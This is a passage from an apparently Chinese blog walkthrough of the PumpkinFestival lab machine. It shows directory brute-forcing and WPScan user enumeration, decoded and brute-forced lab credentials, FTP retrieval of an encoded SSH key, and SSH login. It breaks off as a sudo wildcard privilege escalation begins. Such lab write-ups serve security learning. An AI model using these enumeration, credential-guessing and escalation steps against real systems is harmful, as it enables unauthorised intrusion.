/.htaccess_extra<br>[03:16:04] 403 -  285B  - /.htm<br>[03:16:04] 403 -  291B  - /.htpasswds<br>[03:16:04] 403 -  295B  - /.htpasswd_test<br>[03:16:04] 403 -  292B  - /.httr-oauth                                     <br>[03:16:05] 403 -  285B  - /.php                                            <br>[03:16:05] 403 -  286B  - /.php3<br>[03:16:24] 301 -    0B  - /index.php  -&gt;  http://pumpkins.local/            <br>[03:16:24] 301 -    0B  - /index.php/login/  -&gt;  http://pumpkins.local/login/<br>[03:16:25] 200 -   20KB - /license.txt                                      <br>[03:16:32] 200 -  642B  - /readme.html                                      <br>[03:16:33] 403 -  295B  - /server-status/                                   <br>[03:16:33] 403 -  294B  - /server-status<br>[03:16:40] 301 -  318B  - /wp-admin  -&gt;  http://pumpkins.local/wp-admin/    <br>[03:16:40] 200 -    0B  - /wp-content/                                      <br>[03:16:40] 302 -    0B  - /wp-admin/  -&gt;  http://pumpkins.local/wp-login.php?redirect_to=http%3A%2F%2Fpumpkins.<span class="hljs-built_in">local</span>%2Fwp-admin%2F&amp;reauth=1<br>[03:16:40] 301 -  320B  - /wp-content  -&gt;  http://pumpkins.local/wp-content/<br>[03:16:40] 400 -    1B  - /wp-admin/admin-ajax.php                          <br>[03:16:40] 500 -    3KB - /wp-admin/setup-config.php<br>[03:16:40] 200 -    0B  - /wp-config.php                                    <br>[03:16:40] 200 -    1KB - /wp-admin/install.php                             <br>[03:16:40] 403 -  317B  - /wp-content/plugins/akismet/admin.php             <br>[03:16:40] 403 -  319B  - /wp-content/plugins/akismet/akismet.php           <br>[03:16:40] 500 -    0B  - /wp-content/plugins/hello.php                     <br>[03:16:40] 200 -  967B  - /wp-content/uploads/                              <br>[03:16:40] 301 -  321B  - /wp-includes  -&gt;  http://pumpkins.local/wp-includes/<br>[03:16:40] 500 -    0B  - /wp-includes/rss-functions.php                    <br>[03:16:40] 200 -    0B  - /wp-cron.php                                      <br>[03:16:40] 200 -   40KB - /wp-includes/                                     <br>[03:16:40] 200 -    2KB - /wp-login.php                                     <br>[03:16:40] 302 -    0B  - /wp-signup.php  -&gt;  http://pumpkins.local/wp-login.php?action=register<br>[03:16:40] 405 -   42B  - /xmlrpc.php                                       <br>                                                                             <br>Task Completed<br></code></pre></td></tr></table></figure>
+
+<p>依次查看</p>
+<p><img src="/pic/23a93894c292b323040b2e3a8432bc6a_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>又一个</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">PumpkinToken</span> : <span class="hljs-number">5</span>ff346114d634a015ce413e1bc3d8d71<br><span class="hljs-comment"># 第四个PumpkinToken</span><br></code></pre></td></tr></table></figure>
+
+<p><code>readme.html</code> 的返回有点奇怪，没有 <code>PumpkinToken</code> 的提示，先记录下来吧</p>
+<p><img src="/pic/4742b3546d447b4f8ae171eeeb0f7ae2_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>uploads 目录里只是一张图片，是 wordpress 的常见路径。以防万一下载到本地查看了一下，应该没有隐写</p>
+<p><img src="/pic/beb7a0e22f0634ae079f1821dc4454c2_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>/wp-includes/</code> 中也是一些文件，但是没有发现隐藏的<code>PumpkinToken</code></p>
+<p><img src="/pic/e2a67e406386e0128a7ece8a2d79ee85_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>目录爆破的结果中有注册页面，尝试注册，但是这并不是一个真实网站，邮箱收不到注册邮件。既然是 wordpress 网站，wpscan 试试吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ wpscan --url http://pumpkins.local/ -e ap,u<br>_______________________________________________________________<br>         __          _______   _____<br>         \ \        / /  __ \ / ____|<br>          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®<br>           \ \/  \/ / |  ___/ \___ \ / __|/ _` | \_ \<br>            \  /\  /  | |     ____) | (__| (_| | | | |<br>             \/  \/   |_|    |_____/ \___|\__,_|_| |_|<br><br>         WordPress Security Scanner by the WPScan Team<br>                         Version 3.8.24<br>       Sponsored by Automattic - https://automattic.com/<br>       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart<br>_______________________________________________________________<br><br>[i] It seems like you have not updated the database <span class="hljs-keyword">for</span> some time.<br>[?] Do you want to update now? [Y]es [N]o, default: [N]n<br>[+] URL: http://pumpkins.local/ [192.168.56.140]<br>[+] Started: Sun Sep 10 03:24:14 2023<br><br>Interesting Finding(s):<br><br>[+] Headers<br> | Interesting Entries:<br> |  - Server: Apache/2.4.7 (Ubuntu)<br> |  - X-Powered-By: PHP/5.5.9-1ubuntu4.29<br> | Found By: Headers (Passive Detection)<br> | Confidence: 100%<br><br>[+] XML-RPC seems to be enabled: http://pumpkins.local/xmlrpc.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br> | References:<br> |  - http://codex.wordpress.org/XML-RPC_Pingback_API<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/<br> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/<br> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/<br><br>[+] WordPress readme found: http://pumpkins.local/readme.html<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] Registration is enabled: http://pumpkins.local/wp-login.php?action=register<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] Upload directory has listing enabled: http://pumpkins.local/wp-content/uploads/<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 100%<br><br>[+] The external WP-Cron seems to be enabled: http://pumpkins.local/wp-cron.php<br> | Found By: Direct Access (Aggressive Detection)<br> | Confidence: 60%<br> | References:<br> |  - https://www.iplocation.net/defend-wordpress-from-ddos<br> |  - https://github.com/wpscanteam/wpscan/issues/1299<br><br>[+] WordPress version 4.9.3 identified (Insecure, released on 2018-02-05).<br> | Found By: Rss Generator (Passive Detection)<br> |  - http://pumpkins.local/?feed=rss2, &lt;generator&gt;https://wordpress.org/?v=4.9.3&lt;/generator&gt;<br> |  - http://pumpkins.local/?feed=comments-rss2, &lt;generator&gt;https://wordpress.org/?v=4.9.3&lt;/generator&gt;<br><br>[+] WordPress theme <span class="hljs-keyword">in</span> use: twentyseventeen<br> | Location: http://pumpkins.local/wp-content/themes/twentyseventeen/<br> | Last Updated: 2023-03-29T00:00:00.000Z<br> | Readme: http://pumpkins.local/wp-content/themes/twentyseventeen/README.txt<br> | [!] The version is out of <span class="hljs-built_in">date</span>, the latest version is 3.2<br> | Style URL: http://pumpkins.local/wp-content/themes/twentyseventeen/style.css?ver=4.9.3<br> | Style Name: Twenty Seventeen<br> | Style URI: https://wordpress.org/themes/twentyseventeen/<br> | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...<br> | Author: the WordPress team<br> | Author URI: https://wordpress.org/<br> |<br> | Found By: Css Style In Homepage (Passive Detection)<br> |<br> | Version: 1.4 (80% confidence)<br> | Found By: Style (Passive Detection)<br> |  - http://pumpkins.local/wp-content/themes/twentyseventeen/style.css?ver=4.9.3, Match: \<span class="hljs-string">&#x27;Version: 1.4\&#x27;</span><br><br>[+] Enumerating All Plugins (via Passive Methods)<br><br>[i] No plugins Found.<br><br>[+] Enumerating Users (via Passive and Aggressive Methods)<br> Brute Forcing Author IDs - Time: 00:00:00 &lt;======================================&gt; (10 / 10) 100.00% Time: 00:00:00<br><br>[i] User(s) Identified:<br><br>[+] admin<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)<br><br>[+] morse<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)<br><br>[+] loly<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)<br><br>[+] loly2<br> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br> | Confirmed By: Login Error Messages (Aggressive Detection)<br></code></pre></td></tr></table></figure>
+
+<p>loly 和 loly2 是我注册的用户名，这里得到了 admin 和 morse 两个用户名。</p>
+<h2 id="base62-编码"><a href="#base62-编码" class="headerlink" title="base62 编码"></a>base62 编码</h2><p>在这里卡了很久，有的时候不只是场景的熟悉度，脑子也得够灵活才能应对。看似我这里已经尽己所能了（除了爆破，尝试了用几个收集到的用户名，常用的 10000 个密码来爆破，没得到结果，使用 rockyou.txt 爆破了一晚上也没跑完）。这里的第一个关键是 <code>readme.html</code></p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">K<span class="hljs-number">82</span>v<span class="hljs-number">0</span>SuvV<span class="hljs-number">1</span>E<span class="hljs-symbol">n350</span><span class="hljs-name">M0</span>uxiXVRTmBrQIJQ<span class="hljs-symbol">N78</span>s<br></code></pre></td></tr></table></figure>
+
+<p>尽管我也尝试了将其作为密码来爆破登录，无论是 ftp 还是 wordpress，但是都没收获。实际上关于这串字符串，常规的解码都得不到答案，但令我受挫的是我没有合理地这串字符串的价值做出判断，只是简单地考虑将其作为密码，虽然也将 PumpkinToken 也作为密码来爆破尝试，不过无效功还是太多。</p>
+<p>通过 <a target="_blank" rel="noopener" href="https://gchq.github.io/CyberChef">From Base62 - CyberChef (gchq.github.io)</a> 工具来不断尝试不同的解码方式解密成功</p>
+<p><img src="/pic/162bba049adaed9a0cb465d6c4d30f1a_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们拿到了用户名和密码的两对映射，尝试 ssh 登录的时候发现这台机器并不支持 ssh 密码登录，应该是只能通过密钥来登录</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">-----------------------------------------------------------------------</span><br><span class="hljs-code">                          Welcome to Mission-Pumpkin</span><br><span class="hljs-code">      All remote connections to this machine are monitored and recorded</span><br><span class="hljs-code">-----------------------------------------------------------------------</span><br><br>jack@192.168.56.140: Permission denied (publickey).<br></code></pre></td></tr></table></figure>
+
+<p>如何获取 ssh 密钥，就需要继续之前提到过的忽略的关键点了。不过我们看到这里还有个 morse 用户名，这和 wpscan 扫描结果中的用户是一致的，我们尝试登录 wordpress 后台看看</p>
+<p><code>morse:Ug0t!TrIpyJ</code> 登录成功，不过用户权限有限，而 admin 的密码并不是这个，翻来翻去只在 Profile 中找到了一个 <code>PumpkinToken</code>。继续看如何获取 ssh 密钥吧。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">PumpkinToken</span> : <span class="hljs-number">7139</span>e925fd43618653e51f820bc6201b<br><span class="hljs-comment"># 第五个PumpkinToken</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="FTP-爆破"><a href="#FTP-爆破" class="headerlink" title="FTP 爆破"></a>FTP 爆破</h2><p>第二个关键点是 ftp 爆破的问题，这个点确实……如果接下来有台靶机也是这个尿性，我估计还会卡在这里。没办法，爆破字典如果选太大的，爆破时间太久，爆破字典太小又没有结果，自己制作的字典也不一定有效。</p>
+<p>这里靶机制作者把密码放在了 rockyou 里靠后的部分，爆破时间真的长。</p>
+<p>直接在 WP 里看了密码 <code>yrrah</code></p>
+<p>ftp 登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ ftp 192.168.56.140<br>Connected to 192.168.56.140.<br>220 Welcome to Pumpkin\<span class="hljs-string">&#x27;s FTP service.</span><br><span class="hljs-string">Name (192.168.56.140:kali): harry</span><br><span class="hljs-string">331 Please specify the password.</span><br><span class="hljs-string">Password: </span><br><span class="hljs-string">230 Login successful.</span><br><span class="hljs-string">Remote system type is UNIX.</span><br><span class="hljs-string">Using binary mode to transfer files.</span><br><span class="hljs-string">ftp&gt; binary</span><br><span class="hljs-string">200 Switching to Binary mode.</span><br><span class="hljs-string">ftp&gt; ls -alih</span><br><span class="hljs-string">229 Entering Extended Passive Mode (|||24552|).</span><br><span class="hljs-string">150 Here comes the directory listing.</span><br><span class="hljs-string">drwx------    3 1002     1002         4096 Jul 15  2019 .</span><br><span class="hljs-string">drwxr-xr-x    5 0        0            4096 Jul 12  2019 ..</span><br><span class="hljs-string">-rw-------    1 1002     1002            8 Jul 15  2019 .bash_history</span><br><span class="hljs-string">-rw-r--r--    1 1002     1002          220 Jul 12  2019 .bash_logout</span><br><span class="hljs-string">-rw-r--r--    1 1002     1002         3637 Jul 12  2019 .bashrc</span><br><span class="hljs-string">-rw-r--r--    1 1002     1002          675 Jul 12  2019 .profile</span><br><span class="hljs-string">drwxr-xr-x    3 0        0            4096 Jul 12  2019 Donotopen</span><br><span class="hljs-string">-rw-r--r--    1 0        0              48 Jul 12  2019 token.txt</span><br><span class="hljs-string">226 Directory send OK.</span><br></code></pre></td></tr></table></figure>
+
+<p>依次查看 <code>.bash_history</code>, <code>token.txt</code>, <code>Donotopen</code> </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ <span class="hljs-built_in">cat</span> .bash_history                                                                       <br><span class="hljs-built_in">ls</span><br><span class="hljs-built_in">exit</span><br><br>┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ <span class="hljs-built_in">cat</span> token.txt<br>PumpkinToken : ba9fa9abf2be9373b7cbd9a6457f374e<br><span class="hljs-comment"># 第六个PumpkinToken</span><br></code></pre></td></tr></table></figure>
+
+<p><code>Donotopen</code> 是一个目录，不断进去，发现有个文件和一个目录，先把文件下载到本地查看，再进另一个文件查看</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">48 bytes received <span class="hljs-keyword">in</span> 00:00 (17.32 KiB/s)<br>ftp&gt; <span class="hljs-built_in">pwd</span><br>Remote directory: /home/harry/Donotopen/NO/NOO/NOOO/NOOOO<br>ftp&gt; <span class="hljs-built_in">ls</span><br>229 Entering Extended Passive Mode (|||46745|).<br>150 Here comes the directory listing.<br>drwxr-xr-x    3 0        0            4096 Jul 14  2019 NOOOOO<br>-rw-r--r--    1 0        0              48 Jul 12  2019 token.txt<br>226 Directory send OK.<br>ftp&gt; <span class="hljs-built_in">cd</span> NOOOOO<br>250 Directory successfully changed.<br>ftp&gt; <span class="hljs-built_in">ls</span><br>229 Entering Extended Passive Mode (|||52087|).<br>150 Here comes the directory listing.<br>drwxr-xr-x    2 0        0            4096 Jul 14  2019 NOOOOOO<br>226 Directory send OK.<br>ftp&gt; <span class="hljs-built_in">cd</span> NOOOOOO<br>250 Directory successfully changed.<br>ftp&gt; <span class="hljs-built_in">ls</span><br>229 Entering Extended Passive Mode (|||29574|).<br>150 Here comes the directory listing.<br>-rw-r--r--    1 0        0            4357 Jul 14  2019 data.txt<br>226 Directory send OK.<br>ftp&gt; get data.txt<br><span class="hljs-built_in">local</span>: data.txt remote: data.txt<br>229 Entering Extended Passive Mode (|||61794|).<br>150 Opening BINARY mode data connection <span class="hljs-keyword">for</span> data.txt (4357 bytes).<br>100% |***********************************************************************|  4357        2.03 MiB/s    00:00 ETA<br>226 Transfer complete.<br>4357 bytes received <span class="hljs-keyword">in</span> 00:00 (1.60 MiB/s)<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ <span class="hljs-built_in">cat</span> token.txt<br>PumpkinToken : f9c5053d01e0dfc30066476ab0f0564c<br><span class="hljs-comment"># 第七个PumpkinToken</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="文件内容里的十六进制"><a href="#文件内容里的十六进制" class="headerlink" title="文件内容里的十六进制"></a>文件内容里的十六进制</h2><p>data.txt 的情况比较复杂，问问 chatgpt</p>
+<p><img src="/pic/ab8a412c4f449a755a9e9ecfe48954cd_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>这方面还是得看它啊</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ <span class="hljs-built_in">cp</span> data.txt data.tar                          <br>                                                                                                                    <br>┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ tar -xvf data.tar <br>data<br>tar: A lone zero block at 8<br><br>┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ file data         <br>data: bzip2 compressed data, block size = 900k<br></code></pre></td></tr></table></figure>
+
+<p>竟然还是压缩文件，再来</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ tar -xvf data    <br>key<br>tar: A lone zero block at 25<br><br>┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ file key <br>key: POSIX tar archive<br><br>┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ tar -xvf key <br>jack<br>tar: A lone zero block at 22<br><br>┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ file jack<br>jack: ASCII text, with very long lines (10106), with no line terminators<br></code></pre></td></tr></table></figure>
+
+<p>jack 虽然是文本文件，但是文件内容是十六进制的文本文件，接下来考虑如何将其转换，这里先偷懒用CyberChef</p>
+<p><img src="/pic/52fae1ab298d1ab5e1154560858edb71_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="ssh-私钥登录"><a href="#ssh-私钥登录" class="headerlink" title="ssh 私钥登录"></a>ssh 私钥登录</h2><p>发现竟然就是我们想要的私钥，将其写入文件，使用密钥登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ xxd -r -ps jack  &gt; jack.bin<br><br>┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ strings jack.bin &gt; sshlogin <br><br>┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ <span class="hljs-built_in">chmod</span> 600 sshlogin  <br><br>┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ ssh -i sshlogin jack@192.168.56.140 -p6880 <br>-----------------------------------------------------------------------<br>                          Welcome to Mission-Pumpkin<br>      All remote connections to this machine are monitored and recorded<br>-----------------------------------------------------------------------<br>jack@192.168.56.140: Permission denied (publickey).<br></code></pre></td></tr></table></figure>
+
+<p>不知道为什么还是报错，加上-vv 参数看看</p>
+<p><img src="/pic/accad25850ad648e119522f39dec495d_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>找到了原因，还是经典的问题，加上参数继续</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/PumpkinFestival]<br>└─$ ssh -i jackkey.key jack@192.168.56.140 -p 6880 -oPubkeyAcceptedKeyTypes=+ssh-rsa <br>------------------------------------------------------------------------------<br>                          Welcome to Mission-Pumpkin<br>      All remote connections to this machine are monitored and recorded<br>------------------------------------------------------------------------------<br><br>Last login: Tue Jul 16 08:12:07 2019 from 192.168.1.105<br>-bash: /home/jack/.bash_profile: Permission denied<br>jack@pumpkin:~$ <span class="hljs-built_in">whoami</span><br>jack<br>jack@pumpkin:~$ <span class="hljs-built_in">id</span><br>uid=1000(jack) gid=1000(jack) <span class="hljs-built_in">groups</span>=1000(jack),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)<br>jack@pumpkin:~$ ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default <br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:fa:92:8e brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.140/24 brd 192.168.56.255 scope global eth0<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::a00:27ff:fefa:928e/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>jack@pumpkin:~$ sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> jack: <br>Matching Defaults entries <span class="hljs-keyword">for</span> jack on pumpkin:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User jack may run the following commands on pumpkin:<br>    (ALL) /home/jack/pumpkins/alohomora*<br></code></pre></td></tr></table></figure>
+
+<h2 id="构建同名文件-sudo-权限提权"><a href="#构建同名文件-sudo-权限提权" class="headerlink" title="构建同名文件 sudo 权限提权"></a>构建同名文件 sudo 权限提权</h2><p>sudo -l 使用的是 wordpress 的密码 <code>Ug0t!TrIpyJ</code>，给的路径是不存在的，所以我们可以尝试自己构建一个该路径下的文件</p>
+<p>其实这里的*是通配符，构建的文件名可以直接为alohomora</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs bash">jack@pumpkin:~$ <span class="hljs-built_in">mkdir</span> pumpkins<br>jack@pumpkin:~$ <span 